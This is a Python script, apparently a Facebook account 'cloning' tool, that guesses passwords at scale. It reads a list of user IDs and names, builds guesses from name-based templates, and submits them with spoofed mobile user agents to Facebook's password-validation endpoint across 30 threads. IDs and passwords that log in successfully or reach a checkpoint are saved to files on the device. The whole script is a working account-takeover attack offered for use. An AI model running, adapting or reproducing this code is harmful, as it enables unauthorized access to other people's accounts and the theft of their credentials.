from os import path
import os,base64,zlib,pip,urllib,time,random,requests
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
        os.system('git pull')
except:pass
fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
 
ugen=[]
ugen=[]
useragent=[]
uaku2=[]
ugen2=[]
uh_ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A510F Build/MMB29K) [FBAN/FB4A;FBAV/538.0.0.53.70;FBPN/com.facebook.katana;FBLC/en_US;FBBV/466617295;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A510F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1080,height=1920};]","Dalvik/2.1.0 (Linux; U; Android 7.1.2; TA-1033 Build/N2G47H)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G7102 Build/KOT49H)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G7105 Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 7.1.1; E5823 Build/32.4.A.1.54)","Dalvik/2.1.0 (Linux; U; Android 7.0; HT50 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G900FD Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 5.1; Lenovo A2010-a Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G965F Build/R16NW)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; Lenovo A6020a46 Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J727V Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; Redmi 4X MIUI/V9.5.4.0.NAMMIFA)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G920F Build/LMY47X)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; Lenovo TB2-X30L Build/LenovoTB2-X30L)","Dalvik/2.1.0 (Linux; U; Android 6.0; Redmi Note 4 MIUI/V9.5.1.0.MBFMIFA)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320FN Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J530F Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 5.1; Tasty Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 5.1; Lenovo P1ma40 Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 5.1; TIT-L01 Build/HONORTIT-L01)","Dalvik/1.6.0 (Linux; U; Android 4.1.2; GT-I9082 Build/JZO54K)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; 3G NOTE XL Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 6.0; Redmi Note 4 MIUI/V8.1.6.0.MBFMIDI)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G920K Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; ONEPLUS A5000 Build/OPM1.171019.011)"])
ugen=[]
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; Android 13;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    
    
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU       
 
logo=("""   
\033[1;32m  888888 88b 88 888888 
\033[1;32m    88   88Yb88   88   
\033[1;32m    88   88 Y88   88   
\033[1;32m    88   88  Y8   88   
\t\t\t   \033[1;33mTOOL ♥️ FILE CLONE
\033[1;32m-------------------------------------------
\033[1;35m   \033[1;32mCREATED BY   :  \033[1;32mANIS \033[1;36m&& \033[1;32mANIS
\033[1;35m   \033[1;33mFACEBOK      : \033[1;33m FIXID-FELIX
\033[1;36m   \033[1;35mGITHUB       :  \033[1;35mFACEBOOK-410
\033[1;32m   \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m   \033[1;35mTEAM         :  \033[1;35mALONE
\033[1;34m   \033[1;32mTOOL VIRSION :  \033[1;32m6
\033[1;32m-------------------------------------------""")
 
def linex():
        print("\033[1;32m-------------------------------------------")
def clear():
        os.system(f'clear')
        print(logo)
loop=0
oks=[]
cps=[]
krk=[]
id=[]
tokenku=[]
os.system('git pull')
 
def KRRSS():
	clear()
	
	print(f"\n \033[1;37m[\033[1;32m1\033[1;37m] FILE CLONEING ")
	print(f" [\033[1;31m0\033[1;37m] Exit")
	me=input(f'\n\n [\033[1;32m•\033[1;37m] Choice : ')	
	if me in ["1", "01","11","A","a"]:
		clear()
		file = input(f'\n [\033[1;32m•\033[1;37m] FILE PATH \033[1;32m: ')
		try:
			fo = open(file,'r').read().splitlines()
		except FileNotFoundError:
			print(f' [\033[1;32mX\033[1;37m] File location Not Found ')
			exit()
		clear();print(f'\n [\033[1;31m1\033[1;37m] Method \033[1;32m1 \n [\033[1;31m2\033[1;37m] Method \033[1;32m2 ')
		mthd=input(f'\n [\033[1;32m•\033[1;37m] Salect : ')
		plist=[]
		try:
			clear();ps_limit = int(input(f'\n [\033[1;32m?\033[1;37m] How Many Passwords Do You Want To Add \033[1;33m: '))
		except:
			ps_limit =1
		clear();print(f'\n [\033[1;32m•\033[1;37m] Example: \033[1;36mfirst last,firtslast,first123 \033[1;37m\n')
		for i in range(ps_limit):
			plist.append(input(f' [\033[1;32m•\033[1;37m] Put password {i+1} :  '))
		clear()
		cx=('y')
		if cx in ['n','N','no','NO','2']:
			krk.append(f'n')
		else:
			krk.append(f'y')
		with tred(max_workers=30) as crack_submit:
			clear()
			total_ids = str(len(fo))
			print(f'\n Total Account : \033[1;32m{total_ids} ')
			print(f"\033[1;36m Use Flight Mode For Speed Up\033[1;37m")
			linex()
			for user in fo:
				ids,names = user.split('|')
				passlist = plist
				if mthd in ['1','01']:
					crack_submit.submit(m1,ids,names,passlist)
				elif mthd in ['2','02']:
					crack_submit.submit(m2,ids,names,passlist)
				
				
def m1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [TNT-M1] \033[1;36m|\033[1;37m %s \033[1;36m|\033[1;37m OK \033[1;36m|\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'm.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'ar-DZ,ar;q=0.9', 'cache-control': 'max-age=0', 'dpr': '1.381250023841858', 'sec-ch-prefers-color-scheme': 'light', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="139", "Google Chrome";v="139"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': uh_ua, 'viewport-width': '980'}
                        getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        KRRSS=session.cookies.get_dict().keys()
                        if "c_user" in KRRSS:
                                
                                print(f'\r\r\033[1;32m [TNT\033[1;36m-\033[1;37m\033[1;32mOK] %s \033[1;36m|\033[1;37m\033[1;32m %s'%(ids,pas))
                        
                        
                                open(f'/sdcard/TNT_OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                
                                break
                        
                        elif 'checkpoint' in KRRSS:
                                if 'y' in krk:
                                        print(f'\r\r\033[1;90m [TNT-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/TNT-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(10)
        loop+=1
                        
 
def m2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [TNT-M2] \033[1;36m|\033[1;37m %s \033[1;36m|\033[1;37m OK \033[1;36m|\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'm.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'ar-DZ,ar;q=0.9', 'cache-control': 'max-age=0', 'dpr': '1.381250023841858', 'sec-ch-prefers-color-scheme': 'light', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="139", "Google Chrome";v="139"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': uh_ua, 'viewport-width': '980'}
                        getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        KRRSS=session.cookies.get_dict().keys()
                        if "c_user" in KRRSS:
                                
                                print(f'\r\r\033[1;32m [TNT\033[1;36m-\033[1;37m\033[1;32mOK] %s \033[1;36m|\033[1;37m\033[1;32m %s'%(ids,pas))
                                
                                open(f'/sdcard/TNT_OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                
                                break
                        
                        elif 'checkpoint' in KRRSS:
                                if 'y' in krk:
                                        print(f'\r\r\033[1;90m [TNT-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/TNT-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(10)
        loop+=1
 
 
KRRSS()
 